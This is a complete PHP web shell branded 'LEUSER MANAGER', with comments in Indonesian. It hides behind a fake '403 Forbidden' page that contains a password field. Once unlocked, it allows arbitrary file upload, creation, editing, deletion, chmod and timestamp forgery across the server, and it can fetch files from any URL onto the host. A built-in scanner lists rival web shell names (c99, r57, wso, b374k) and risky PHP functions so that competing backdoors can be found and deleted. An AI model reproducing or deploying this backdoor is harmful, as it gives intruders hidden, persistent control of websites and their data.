<?php
$auth_pass = "af06b0fc49ffb83df527c9854dacdddeb0b7ad366730d5c97875912eb1699ceb";

function Login() {
  die("<html>
  <title>403 Forbidden</title>
  <center><h1>403 Forbidden</h1></center>
  <hr><center>nginx (apache v.5162 ./daemonn_sys) </center>
  <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if (!empty($auth_pass)) {
    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>...</title>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <link href="https://fonts.googleapis.com/css?family=Arial%20Black" rel="stylesheet">
    <style>
    body {
        font-family: 'Arial Black', sans-serif;
        color: #000;
        margin: 0;
        padding: 0;
        background-color: #242222c9;
    }
    .result-box-container {
        position: relative;
        margin-top: 20px;
    }

    .result-box {
        width: 100%;
        height: 200px;
        padding: 10px;
        border: 1px solid #ddd;
        border-radius: 5px;
        background-color: #f4f4f4;
        overflow: auto;
        box-sizing: border-box;
        font-family: 'Arial Black', sans-serif;
        color: #333;
    }

    .result-box::placeholder {
        color: #999;
    }

    .result-box:focus {
        outline: none;
        border-color: #000000;
    }

    .result-box::-webkit-scrollbar {
        width: 8px;
    }

    .result-box::-webkit-scrollbar-thumb {
        background-color: #000000;
        border-radius: 4px;
    }
    .container {
        max-width: 90%;
        margin: 20px auto;
        padding: 20px;
        background-color: #ffffff;
        border-radius: 44px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .header {
        text-align: center;
        margin-bottom: 20px;
    }
    .header h1 {
        font-size: 24px;
    }
    .subheader {
        text-align: center;
        margin-bottom: 20px;
    }
    .subheader p {
        font-size: 16px;
        font-style: italic;
    }
    form {
        margin-bottom: 20px;
    }
    form input[type="text"],
    form textarea {
        padding: 8px;
        margin-bottom: 10px;
        border: 1px solid #000;
        border-radius: 3px;
        box-sizing: border-box;
        
    }
    form input[type="submit"] {

        padding: 10px;
        background-color: #000000;
        color: white;
        border: none;
        border-radius: 3px;
        cursor: pointer;
    }
    form input[type="file"] {
        padding: 7px;
        background-color: #000000;
        color: white;
        border: none;
        border-radius: 3px;
        cursor: pointer;
    }
    .result-box {
            width: 100%;
            height: 200px;
            resize: none;
            overflow: auto;
            font-family: 'Arial Black';
            background-color: #f4f4f4;
            padding: 10px;
            border: 1px solid #ddd;
            margin-bottom: 10px;
        }
    form input[type="submit"]:hover {
        background-color: #143015;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 20px;
    }
    th, td {
        padding: 8px;
        text-align: left;
    }
    th {
        background-color: #5c5c5c;
    }
    tr:nth-child(even) {
        background-color: #9c9b9bce;
    }
    .item-name {
        max-width: 200px;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
    }
    .size, .date {
        width: 100px;
    }
    .permission {
        font-weight: bold;
        width: 50px;
        text-align: center;
    }
    .writable {
        color: #0db202;
    }
    .not-writable {
        color: #d60909;
    }
textarea[name="file_content"] {
            width: calc(100.9% - 10px);
            margin-bottom: 10px;
            padding: 8px;
            max-height: 500px;
            resize: vertical;
            border: 1px solid #ddd;
            border-radius: 3px;
            font-family: 'Arial Black';
        }
</style>
</head>
<body>
<?php
// ======================================================
// FILE MANAGER START
// ======================================================

$uploadStatus  = null;
$folderStatus  = null;
$fileStatus    = null;
$comadStatus   = null;
$zipStatus     = null;
$extractStatus = null;
$scanStatus    = null;
$scanResults   = [];

$path = $_GET['path'] ?? '.';
$real = realpath($path);
if (!$real || !is_dir($real)) { $path = '.'; $real = realpath('.'); }


/* =====================================================
   BUKA FILE LANGSUNG MELALUI URL PUBLIK
   - Hanya bekerja untuk file yang berada di DOCUMENT_ROOT
   - Nama file dibuka di tab/jendela baru
   ===================================================== */
function axi_public_url($fullPath){
    $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? realpath($_SERVER['DOCUMENT_ROOT']) : false;
    $realFile = realpath($fullPath);

    if (!$docRoot || !$realFile || !is_file($realFile)) {
        return null;
    }

    $docRoot = str_replace('\\', '/', rtrim($docRoot, '/\\'));
    $realFile = str_replace('\\', '/', $realFile);

    // Tolak file yang berada di luar public document root
    if ($realFile !== $docRoot && strpos($realFile, $docRoot . '/') !== 0) {
        return null;
    }

    $relative = ltrim(substr($realFile, strlen($docRoot)), '/');
    $parts = $relative === '' ? [] : explode('/', $relative);
    $parts = array_map('rawurlencode', $parts);

    $https = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== '' && strtolower($_SERVER['HTTPS']) !== 'off';
    $scheme = $https ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? '';

    if ($host === '') {
        return null;
    }

    return $scheme . '://' . $host . '/' . implode('/', $parts);
}



/* =====================================================
   FIX DOWNLOAD BESAR (Streaming tanpa batas)
   ===================================================== */
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    $full = realpath($path . "/" . $file);

    if ($full && is_file($full)) {
        ignore_user_abort(true);
        set_time_limit(0);

        header("Content-Description: File Transfer");
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=\"".basename($full)."\"");
        header("Content-Length: " . filesize($full));

        $chunk = 1024 * 1024;
        $fh = fopen($full, "rb");
        while (!feof($fh)) {
            echo fread($fh, $chunk);
            flush();
        }
        fclose($fh);
        exit;
    } else {
        echo "Download error";
        exit;
    }
}



/* DELETE RECURSIVE */
function axi_delete($target){
    if (is_file($target) || is_link($target)) return @unlink($target);
    if (is_dir($target)){
        foreach(scandir($target) as $i){
            if($i=='.'||$i=='..') continue;
            axi_delete($target.'/'.$i);
        }
        return @rmdir($target);
    }
    return false;
}


/* Upload */
if (isset($_POST['upload']) && isset($_FILES['file']['name'])) {
    $ok=true;
    foreach ($_FILES['file']['name'] as $k=>$n){
        if ($_FILES['file']['error'][$k]==0){
            if(!move_uploaded_file($_FILES['file']['tmp_name'][$k], "$path/$n"))
                $ok=false;
        } else $ok=false;
    }
    $uploadStatus = $ok ? "success" : "error";
}


/* Delete single */
if (isset($_GET['delete'])){
    axi_delete("$path/".$_GET['delete']);
}


/* Delete selected */
if (isset($_POST['delete_selected']) && isset($_POST['selected'])){
    foreach($_POST['selected'] as $x){
        axi_delete("$path/$x");
    }
}


/* Create folder */
if (isset($_POST['newfolder']) && $_POST['foldername']!==""){
    $folderStatus = mkdir("$path/".$_POST['foldername']) ? "success" : "error";
}


/* Create file (NEW — with content) */
if (isset($_POST['createfile_confirm'])) {
    $newfile = trim($_POST['newfilename']);
    $content = $_POST['newfilecontent'];
    if ($newfile !== "") {
        file_put_contents("$path/$newfile", $content);
    }
}


/* COMAD */
if (isset($_POST['comad']) && !empty($_POST['fileurl']) && !empty($_POST['saveas'])){
    $url  = trim($_POST['fileurl']);
    $save = basename(trim($_POST['saveas']));
    $d = @file_get_contents($url);
    $comadStatus = ($d!==false && file_put_contents("$path/$save",$d)!==false) ? "success":"error";
}


/* CHANGE DATE MANUAL */
if (isset($_POST['changedate_btn']) && !empty($_POST['new_date_str'])){
    $targetPath = $path . "/" . $_POST['target_file'];
    $newTime = strtotime($_POST['new_date_str']);
    if ($newTime !== false && file_exists($targetPath)) {
        @touch($targetPath, $newTime);
    }
}


/* CHMOD MANUAL (FITUR BARU) */
if (isset($_POST['chmod_btn']) && !empty($_POST['new_perms'])){
    $targetPath = $path . "/" . $_POST['target_file'];
    $perms = octdec($_POST['new_perms']); // Mengubah string 0755 menjadi oktal
    if (file_exists($targetPath)) {
        @chmod($targetPath, $perms);
    }
}


/* Rename */
if (isset($_POST['renamefile'])){
    @rename("$path/".$_POST['oldname'], "$path/".$_POST['newname']);
}


/* SAVE EDIT */
$saveStatus=null;
if (isset($_POST['savefile'])){
    $saveStatus = (@file_put_contents($_POST['filepath'], $_POST['content'])!==false)
                    ? "success" : "error";
}


/* ZIP SELECTED */
if (isset($_POST['zip_selected']) && isset($_POST['selected'])){
    if(class_exists('ZipArchive')){
        $zipName = trim($_POST['zip_name']);
        if($zipName=='') $zipName = "selected-".date("Ymd-His").".zip";
        if(!preg_match('/\.zip$/i',$zipName)) $zipName.='.zip';

        $zipPath = "$path/$zipName";
        $zip = new ZipArchive();

        if($zip->open($zipPath, ZipArchive::CREATE|ZipArchive::OVERWRITE)){
            foreach($_POST['selected'] as $item){
                $full = "$path/$item";
                if(is_file($full)){
                    $zip->addFile($full, $item);
                } else if(is_dir($full)){
                    $it = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($full, FilesystemIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::SELF_FIRST
                    );
                    foreach($it as $f){
                        $local = substr($f->getPathname(), strlen($path)+1);
                        $f->isDir() ? $zip->addEmptyDir($local) : $zip->addFile($f->getPathname(), $local);
                    }
                }
            }
            $zip->close();
            $zipStatus="success";
        } else $zipStatus="error";

    } else $zipStatus="nozip";
}


/* EXTRACT ZIP */
if(isset($_GET['extract'])){
    $zipFile = "$path/".$_GET['extract'];
    if(is_file($zipFile) && class_exists('ZipArchive')){
        $zip = new ZipArchive();
        if($zip->open($zipFile)===true){
            $zip->extractTo($path);
            $zip->close();
            $extractStatus="success";
        } else $extractStatus="error";
    } else $extractStatus="error";
}


/* =====================================================
   SCAN FILE SENSITIF
   ===================================================== */
if (isset($_POST['scan_files'])) {
    // Pola nama file yang mencurigakan
    $suspiciousPatterns = [
        '/shell\.php$/i',
        '/c99\.php$/i',
        '/r57\.php$/i',
        '/wso\.php$/i',
        '/b374k\.php$/i',
        '/backdoor/i',
        '/webadmin/i',
        '/adminer/i',
        '/filemanager/i',
        '/elfinder/i',
        '/cmd\.php$/i',
        '/symlink\.php$/i',
        '/cgi\.php$/i',
        '/\.phps?$/i',
        '/\.phtml$/i',
        '/\.phar$/i',
        '/\.inc$/i',
        '/axi/i',
        '/upload/i',
        '/admin/i',
        '/config/i'
    ];

    // Kata kunci dalam konten file
    $dangerousKeywords = [
        'eval(',
        'base64_decode(',
        'shell_exec(',
        'system(',
        'passthru(',
        'exec(',
        'popen(',
        'proc_open(',
        'assert(',
        'create_function(',
        '$_REQUEST[',
        '$_GET[',
        '$_POST[',
        'phpinfo()',
        'set_time_limit(0)',
        'ignore_user_abort(1)',
        'gzinflate(',
        'str_rot13('
    ];

    function scanDirectory($dir, &$results, $patterns, $keywords) {
        if (!is_dir($dir)) return;

        $items = @scandir($dir);
        if (!$items) return;

        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;

            $fullPath = $dir . '/' . $item;
            $relativePath = str_replace(realpath('.') . '/', '', realpath($fullPath));

            if (!$relativePath) {
                $relativePath = $fullPath;
            }

            // Skip jika file terlalu besar
            if (is_file($fullPath) && filesize($fullPath) > 10485760) { // 10MB
                continue;
            }

            // Scan untuk nama mencurigakan
            $suspiciousName = false;
            $matchedPattern = '';
            foreach ($patterns as $pattern) {
                if (preg_match($pattern, $item)) {
                    $suspiciousName = true;
                    $matchedPattern = $pattern;
                    break;
                }
            }

            // Scan konten file
            $suspiciousContent = false;
            $foundKeywords = [];
            if (is_file($fullPath) && is_readable($fullPath)) {
                $ext = strtolower(pathinfo($fullPath, PATHINFO_EXTENSION));
                $textExtensions = ['php', 'phtml', 'html', 'htm', 'js', 'txt', 'inc', 'conf', 'config', 'sql', 'log'];

                if (in_array($ext, $textExtensions)) {
                    $content = @file_get_contents($fullPath);
                    if ($content !== false) {
                        foreach ($keywords as $keyword) {
                            if (stripos($content, $keyword) !== false) {
                                $suspiciousContent = true;
                                $foundKeywords[] = $keyword;
                            }
                        }
                    }
                }
            }

            // Jika mencurigakan, tambahkan ke hasil
            if ($suspiciousName || $suspiciousContent) {
                $fileSize = is_file($fullPath) ? round(filesize($fullPath)/1024, 2) . ' KB' : '-';

                $results[] = [
                    'name' => $item,
                    'path' => $relativePath,
                    'full_path' => $fullPath,
                    'type' => is_dir($fullPath) ? 'Directory' : 'File',
                    'size' => $fileSize,
                    'modified' => @date("Y-m-d H:i:s", filemtime($fullPath)),
                    'name_suspicious' => $suspiciousName,
                    'matched_pattern' => $matchedPattern,
                    'content_suspicious' => $suspiciousContent,
                    'found_keywords' => $foundKeywords,
                    'risk_level' => ($suspiciousName && $suspiciousContent) ? 'HIGH' :
                                   ($suspiciousName ? 'MEDIUM' : 'LOW')
                ];
            }

            // Scan subdirectory secara rekursif (batasi kedalaman)
            if (is_dir($fullPath) && count(explode('/', $relativePath)) < 10) {
                scanDirectory($fullPath, $results, $patterns, $keywords);
            }
        }
    }

    // Mulai scanning
    $startTime = microtime(true);
    scanDirectory('.', $scanResults, $suspiciousPatterns, $dangerousKeywords);
    $scanTime = round(microtime(true) - $startTime, 2);

    $scanStatus = count($scanResults) > 0 ? "found" : "clean";
}


/* Hapus file hasil scan */
if (isset($_POST['delete_scan_result']) && isset($_POST['scan_file_path'])) {
    $fileToDelete = $_POST['scan_file_path'];
    if (file_exists($fileToDelete)) {
        if (@unlink($fileToDelete)) {
            $scanStatus = "deleted";
            // Refresh halaman setelah 2 detik
            echo '<meta http-equiv="refresh" content="2;url='.$_SERVER['PHP_SELF'].'">';
        } else {
            $scanStatus = "delete_error";
        }
    }
}


$logo_url="https://veldrive.com/NBCy1vy7/logo.png";

function makeBreadcrumb($p){
    $c=trim($p,"/");
    if($c=="") return '<a href="?path=/">/</a>';
    $exp=explode("/",$c);
    $b="";
    $r='<a href="?path=/">/</a> ';
    foreach($exp as $x){
        if(!$x)continue;
        $b.="/$x";
        $r.='/ <a href="?path='.urlencode($b).'">'.$x.'</a> ';
    }
    return $r;
}

?>
<!DOCTYPE html>
<html>
<head>
<link rel="icon" href="https://veldrive.com/NBCy1vy7/logo.png">
<title>LEUSER MANAGER</title>
<style>
body{background:#111;color:#eee;font-family:Arial;padding:20px;border:1px solid #ff0000}
a{text-decoration:none;color:#00d0ff}
a:hover{color:#55e8ff}

table{width:100%;border-collapse:collapse;margin-top:20px;border:1px solid #ff0000}
td,th{padding:10px;border:1px solid #ff0000}

.action-row{display:flex;gap:15px;margin-top:10px;flex-wrap:wrap}
.action-box{flex:1;min-width:220px;border:1px solid #ff0000;background:#181818;padding:10px;border-radius:5px}
button{padding:6px 12px;background:#ff4444;border:0;color:#fff;border-radius:5px;cursor:pointer}

.alert-success{background:#002800;color:#00ff6a;border-left:4px solid #00ff6a;padding:8px;margin-top:8px}
.alert-error{background:#280000;color:#ff4444;border-left:4px solid #ff4444;padding:8px;margin-top:8px}
.alert-warning{background:#282800;color:#ffff44;border-left:4px solid #ffff00;padding:8px;margin-top:8px}
.alert-info{background:#002828;color:#00ffff;border-left:4px solid #00ffff;padding:8px;margin-top:8px}

.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.75);display:flex;justify-content:center;align-items:center;z-index:9999}
.modal-box{background:#111;border:1px solid #ff0000;border-radius:6px;padding:15px;width:90%;max-width:1000px}

.not-editable{color:#ccc !important;cursor:not-allowed;}
.lock-icon{color:#ff4444;margin-right:4px;}

/* Style untuk hasil scan */
.risk-high{background:#280000 !important;color:#ff4444 !important;}
.risk-medium{background:#282800 !important;color:#ffff44 !important;}
.risk-low{background:#002800 !important;color:#00ff6a !important;}
.scan-result-table th, .scan-result-table td {border:1px solid #444 !important;padding:8px !important;}
.scan-header {background:#222 !important; font-weight:bold;}
</style>

<script>
function renameBox(f){ var e=document.getElementById("rn_"+f); if(e)e.style.display="block"; }
function dateBox(f){ var e=document.getElementById("dt_"+f); if(e)e.style.display="block"; } 
function chmodBox(f){ var e=document.getElementById("ch_"+f); if(e)e.style.display="block"; } // FUNGSI BARU MOD CHMOD
function toggle(s){ document.querySelectorAll('[name="selected[]"]').forEach(x=>x.checked=s.checked); }
function closeEdit(){ let m=document.getElementById("editModal"); if(m)m.remove(); }
function toggleScanResults(){
    let e=document.getElementById("scanResults");
    if(e) e.style.display = e.style.display === 'none' ? 'block' : 'none';
}
function showScanDetails(index) {
    let details = document.getElementById('scan-details-' + index);
    if (details) details.style.display = details.style.display === 'none' ? 'block' : 'none';
}
</script>
</head>
<body>

<div style="display:flex;justify-content:space-between;align-items:center">
    <h2>LEUSER MANAGER</h2>
    <img src="<?php echo $logo_url; ?>" height="55">
</div>

<p><b>Current Path:</b> <?php echo makeBreadcrumb($real); ?></p>

<?php if($scanStatus == "found"): ?>
<div class="alert-warning">
    ⚠ <b>Ditemukan <?php echo count($scanResults); ?> file/direktori mencurigakan!</b>
    <button onclick="toggleScanResults()" style="margin-left:10px;background:#ffff00;color:#000;padding:3px 8px;font-size:12px">
        Tampilkan/Sembunyikan Hasil
    </button>
    <?php if(isset($scanTime)): ?>
    <span style="margin-left:10px;font-size:12px">(Waktu scan: <?php echo $scanTime; ?> detik)</span>
    <?php endif; ?>
</div>
<?php elseif($scanStatus == "clean"): ?>
<div class="alert-success">
    ✔ <b>Scan selesai. Tidak ditemukan file mencurigakan.</b>
    <?php if(isset($scanTime)): ?>
    <span style="margin-left:10px;font-size:12px">(Waktu scan: <?php echo $scanTime; ?> detik)</span>
    <?php endif; ?>
</div>
<?php elseif($scanStatus == "deleted"): ?>
<div class="alert-success">
    ✔ <b>File berhasil dihapus. Halaman akan direfresh...</b>
</div>
<?php elseif($scanStatus == "delete_error"): ?>
<div class="alert-error">
    ✖ <b>Gagal menghapus file.</b>
</div>
<?php endif; ?>

<div class="action-row">

    <div class="action-box">
        <h3>1. Upload</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file[]" multiple>
            <button type="submit" name="upload">Upload</button>
        </form>
        <?php if($uploadStatus==="success"): ?>
        <div class="alert-success">✔ Upload berhasil</div>
        <?php elseif($uploadStatus==="error"): ?>
        <div class="alert-error">✖ Upload gagal</div>
        <?php endif; ?>
    </div>

    <div class="action-box">
        <h3>2. Create Folder</h3>
        <form method="post">
            <input name="foldername">
            <button type="submit" name="newfolder">Create</button>
        </form>
        <?php if($folderStatus==="success"): ?>
        <div class="alert-success">✔ Folder created</div>
        <?php elseif($folderStatus==="error"): ?>
        <div class="alert-error">✖ Create failed</div>
        <?php endif; ?>
    </div>

    <div class="action-box">
        <h3>3. Create File</h3>
        <button type="button" onclick="document.getElementById('createFileModal').style.display='flex'">Create File</button>
    </div>

    <div class="action-box">
        <h3>4. COMAD</h3>
        <form method="post">
            <input name="fileurl" placeholder="https://...">
            <input name="saveas" placeholder="nama.ext">
            <button type="submit" name="comad">Fetch</button>
        </form>
        <?php if($comadStatus==="success"): ?>
        <div class="alert-success">✔ File fetched</div>
        <?php elseif($comadStatus==="error"): ?>
        <div class="alert-error">✖ Fetch failed</div>
        <?php endif; ?>
    </div>

    <div class="action-box">
        <h3 style="color:#ff4444">5. Scan Sensitive Files</h3>
        <p style="font-size:12px;color:#aaa;margin:5px 0">Scan webshell, file manager, backdoor</p>
        <form method="post">
            <button type="submit" name="scan_files" style="background:#ff4444;width:100%">
                🔍 Start Scanning
            </button>
        </form>
        <p style="font-size:10px;color:#888;margin-top:5px">
            Akan scan: .php, .phtml, config files, dll.
        </p>
    </div>

</div>

<?php if(!empty($scanResults)): ?>
<div id="scanResults" style="display:block; margin-top:20px;">
    <h3 style="color:#ff4444">📊 Hasil Scanning File Sensitif</h3>
    <p style="font-size:12px;color:#aaa;">Total ditemukan: <?php echo count($scanResults); ?> item</p>

    <table class="scan-result-table">
        <tr class="scan-header">
            <th>Nama File</th>
            <th>Tipe</th>
            <th>Ukuran</th>
            <th>Modified</th>
            <th>Risk Level</th>
            <th>Deteksi</th>
            <th>Aksi</th>
        </tr>
        <?php foreach($scanResults as $index => $result): ?>
        <tr class="risk-<?php echo strtolower($result['risk_level']); ?>">
            <td>
                <strong><?php echo htmlspecialchars($result['name']); ?></strong><br>
                <small style="color:#aaa; font-size:11px;"><?php echo htmlspecialchars($result['path']); ?></small>
                <button onclick="showScanDetails(<?php echo $index; ?>)"
                        style="margin-left:5px;background:transparent;border:1px solid #666;color:#aaa;padding:1px 5px;font-size:10px;cursor:pointer">
                    Details
                </button>
            </td>
            <td><?php echo $result['type']; ?></td>
            <td><?php echo $result['size']; ?></td>
            <td><?php echo $result['modified']; ?></td>
            <td><b><?php echo $result['risk_level']; ?></b></td>
            <td>
                <?php if($result['name_suspicious']): ?>
                <span style="color:#ff4444">Nama</span>
                <?php endif; ?>
                <?php if($result['content_suspicious']): ?>
                <?php if($result['name_suspicious']) echo '+'; ?>
                <span style="color:#ff8800">Konten</span>
                <?php endif; ?>
            </td>
            <td>
                <?php if($result['type'] == 'File'): ?>
                <form method="post" style="display:inline;">
                    <input type="hidden" name="scan_file_path" value="<?php echo htmlspecialchars($result['full_path']); ?>">
                    <button type="submit" name="delete_scan_result"
                            onclick="return confirm('Hapus file ini?\n<?php echo addslashes($result['path']); ?>')"
                            style="background:#ff0000;padding:3px 8px;font-size:12px;margin:2px">
                        Hapus
                    </button>
                </form>
                <a href="?path=<?php echo urlencode(dirname($result['full_path'])); ?>&edit=<?php echo urlencode($result['full_path']); ?>"
                   style="background:#00d0ff;color:#000;padding:3px 8px;font-size:12px;border-radius:3px;margin:2px;display:inline-block">
                    Edit
                </a>
                <?php else: ?>
                <a href="?path=<?php echo urlencode($result['full_path']); ?>"
                   style="background:#444;color:#fff;padding:3px 8px;font-size:12px;border-radius:3px;margin:2px;display:inline-block">
                    Buka
                </a>
                <?php endif; ?>
            </td>
        </tr>
        <tr id="scan-details-<?php echo $index; ?>" style="display:none;background:#1a1a1a;">
            <td colspan="7" style="padding:10px;">
                <div style="font-size:12px;">
                    <strong>Detail Deteksi:</strong><br>
                    <?php if($result['name_suspicious']): ?>
                    • <span style="color:#ff4444">Nama mencurigakan:</span> Cocok dengan pola <?php echo htmlspecialchars($result['matched_pattern']); ?><br>
                    <?php endif; ?>
                    <?php if($result['content_suspicious'] && !empty($result['found_keywords'])): ?>
                    • <span style="color:#ff8800">Keyword ditemukan:</span>
                    <?php echo implode(', ', array_slice($result['found_keywords'], 0, 5)); ?>
                    <?php if(count($result['found_keywords']) > 5): ?>... (total: <?php echo count($result['found_keywords']); ?>)<?php endif; ?>
                    <br>
                    <?php endif; ?>
                    • <span style="color:#00aaff">Path lengkap:</span> <?php echo htmlspecialchars($result['full_path']); ?>
                </div>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>

    <div style="margin-top:15px;padding:10px;background:#181818;border:1px solid #444;">
        <h4>📝 Informasi Deteksi:</h4>
        <ul style="font-size:12px;color:#aaa;">
            <li><b style="color:#ff4444">Deteksi Nama File:</b> shell.php, c99.php, r57.php, wso.php, backdoor, filemanager, admin, config, upload, dll.</li>
            <li><b style="color:#ff8800">Deteksi Konten:</b> eval(), base64_decode(), shell_exec(), system(), exec(), phpinfo(), dll.</li>
            <li><b>Level Risiko:</b>
                <span style="color:#ff4444">HIGH</span> (nama+konten),
                <span style="color:#ffff44">MEDIUM</span> (nama saja),
                <span style="color:#00ff6a">LOW</span> (konten saja).
            </li>
            <li>File yang discan: .php, .phtml, .html, .js, .txt, .config, dan file teks lainnya (maks 10MB).</li>
        </ul>
    </div>
</div>
<?php endif; ?>

<div id="createFileModal" class="modal-overlay" style="display:none">
    <div class="modal-box">
        <h3 style="color:#00d0ff">Create New File</h3>

        <form method="post">
            <input type="hidden" name="createfile_confirm" value="1">

            <p>Filename:</p>
            <input name="newfilename" style="width:100%;padding:8px;background:#000;color:#0f0;border:1px solid #ff0000" placeholder="example.php">

            <p style="margin-top:10px">File Content:</p>
            <textarea name="newfilecontent" style="width:100%;height:300px;background:#000;color:#0f0;border:1px solid #ff0000" placeholder="&lt;?php echo 'Hello World'; ?&gt;"></textarea>

            <div style="text-align:right;margin-top:10px">
                <button type="submit" style="background:#00d0ff;color:#000">Create</button>
                <button type="button" onclick="document.getElementById('createFileModal').style.display='none'" style="background:#ff0000">Cancel</button>
            </div>
        </form>
    </div>
</div>
<form method="post" style="margin-top:20px">

<button type="submit" name="delete_selected" onclick="return confirm('Delete selected?')">Delete Selected</button>

<input type="text" name="zip_name" placeholder="selected-YYYYMMDD-HHMMSS.zip" style="margin-left:10px;padding:6px 8px;">
<button type="submit" name="zip_selected">ZIP Selected</button>

<?php
if($zipStatus==="success")  echo '<div class="alert-success">✔ ZIP created</div>';
elseif($zipStatus==="error") echo '<div class="alert-error">✖ ZIP failed</div>';
elseif($zipStatus==="nozip")echo '<div class="alert-error">✖ ZipArchive tidak tersedia</div>';

if($extractStatus==="success")  echo '<div class="alert-success">✔ ZIP extracted</div>';
elseif($extractStatus==="error") echo '<div class="alert-error">✖ Extract failed</div>';
?>

<table>
<tr>
    <th><input type="checkbox" onclick="toggle(this)"></th>
    <th>Name</th>
    <th>Size</th>
    <th>Last Modified</th>
    <th>Mod Date</th>
    <th>Perms</th> <th>Download</th>
    <th>Rename</th>
    <th>Delete</th>
    <th>Extract</th>
</tr>


<?php
$scan=scandir($path);
$dirs=[];$files=[];
foreach($scan as $f){
    if($f=="."||$f=="..")continue;
    is_dir("$path/$f") ? $dirs[]=$f : $files[]=$f;
}
sort($dirs); sort($files);
$all=array_merge($dirs,$files);

foreach($all as $f):
$full="$path/$f";
$isDir=is_dir($full);
$size=$isDir?"-":round(@filesize($full)/1024,2)." KB";

// URL publik file untuk fitur klik langsung buka di tab baru
$publicUrl = !$isDir ? axi_public_url($full) : null;

$isEditable = (!$isDir && is_writable($full));
// Mengambil data permission
$perms = @fileperms($full) ? substr(sprintf('%o', fileperms($full)), -4) : '0000';
?>
<tr>
<td><input type="checkbox" name="selected[]" value="<?php echo htmlspecialchars($f); ?>"></td>

<td>
<?php
$icon = $isDir
    ? "📁"
    : (preg_match('/\.(php|html|js|css)$/i', $f) ? "🖥️" : "📄");

echo $icon . " ";
?>

<?php if($isDir): ?>

    <a href="?path=<?php echo urlencode($full); ?>"><strong><?php echo htmlspecialchars($f); ?></strong></a>

<?php else: ?>

    <?php if($publicUrl): ?>
        <!-- Klik nama file: buka URL file langsung di tab/jendela baru -->
        <a href="<?php echo htmlspecialchars($publicUrl, ENT_QUOTES); ?>"
           target="_blank"
           rel="noopener noreferrer"
           title="Buka file langsung">
            <strong><?php echo htmlspecialchars($f); ?></strong>
        </a>

        <?php if($isEditable): ?>
            <!-- Edit tetap dipertahankan agar fitur lama tidak hilang -->
            <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($full); ?>"
               style="margin-left:8px;font-size:11px;color:#00ff6a"
               title="Edit source file">[Edit]</a>
        <?php endif; ?>

    <?php elseif($isEditable): ?>
        <!-- File di luar DOCUMENT_ROOT tidak memiliki URL publik; buka editor -->
        <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($full); ?>">
            <strong><?php echo htmlspecialchars($f); ?></strong>
        </a>
    <?php else: ?>
        <span class="lock-icon">🔒</span>
        <span class="not-editable"><strong><?php echo htmlspecialchars($f); ?></strong></span>
    <?php endif; ?>

<?php endif; ?>
</td>

<td><?php echo $size; ?></td>
<td><?php echo date("Y-m-d H:i:s", @filemtime($full)); ?></td>

<td>
<a href="#" onclick="dateBox('<?php echo htmlspecialchars($f,ENT_QUOTES); ?>');return false;" style="color:#00ff6a;">Mod Date</a>
<div id="dt_<?php echo htmlspecialchars($f,ENT_QUOTES); ?>" style="display:none;margin-top:5px">
    <form method="post">
        <input type="hidden" name="target_file" value="<?php echo htmlspecialchars($f); ?>">
        <input name="new_date_str" value="<?php echo date("Y-m-d H:i:s", @filemtime($full)); ?>" style="width:130px;font-size:11px;padding:2px;background:#000;color:#0f0;border:1px solid #ff0000;">
        <button type="submit" name="changedate_btn" style="padding:2px 6px;font-size:10px;background:#00d0ff;color:#000;">OK</button>
    </form>
</div>
</td>

<td>
<a href="#" onclick="chmodBox('<?php echo htmlspecialchars($f,ENT_QUOTES); ?>');return false;" style="color:#a855f7;" title="Change Permissions"><?php echo $perms; ?></a>
<div id="ch_<?php echo htmlspecialchars($f,ENT_QUOTES); ?>" style="display:none;margin-top:5px">
    <form method="post">
        <input type="hidden" name="target_file" value="<?php echo htmlspecialchars($f); ?>">
        <input name="new_perms" value="<?php echo $perms; ?>" style="width:50px;font-size:11px;padding:2px;background:#000;color:#0f0;border:1px solid #ff0000;" placeholder="0755">
        <button type="submit" name="chmod_btn" style="padding:2px 6px;font-size:10px;background:#00d0ff;color:#000;">OK</button>
    </form>
</div>
</td>

<td>
<?php
echo $isDir
? '-'
: '<a href="?path='.urlencode($path).'&download='.urlencode($f).'">Download</a>';
?>
</td>

<td>
<a href="#" onclick="renameBox('<?php echo htmlspecialchars($f,ENT_QUOTES); ?>');return false;">Rename</a>
<div id="rn_<?php echo htmlspecialchars($f,ENT_QUOTES); ?>" style="display:none;margin-top:5px">
    <form method="post">
        <input type="hidden" name="oldname" value="<?php echo htmlspecialchars($f); ?>">
        <input name="newname" value="<?php echo htmlspecialchars($f); ?>">
        <button type="submit" name="renamefile">OK</button>
    </form>
</div>
</td>

<td>
<a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($f); ?>" onclick="return confirm('Delete?')">Delete</a>
</td>

<td>
<?php
$ext=strtolower(pathinfo($f,PATHINFO_EXTENSION));
echo (!$isDir && $ext=='zip')
? '<a href="?path='.urlencode($path).'&extract='.urlencode($f).'" onclick="return confirm(\'Extract here?\')">Extract</a>'
: '-';
?>
</td>

</tr>
<?php endforeach; ?>

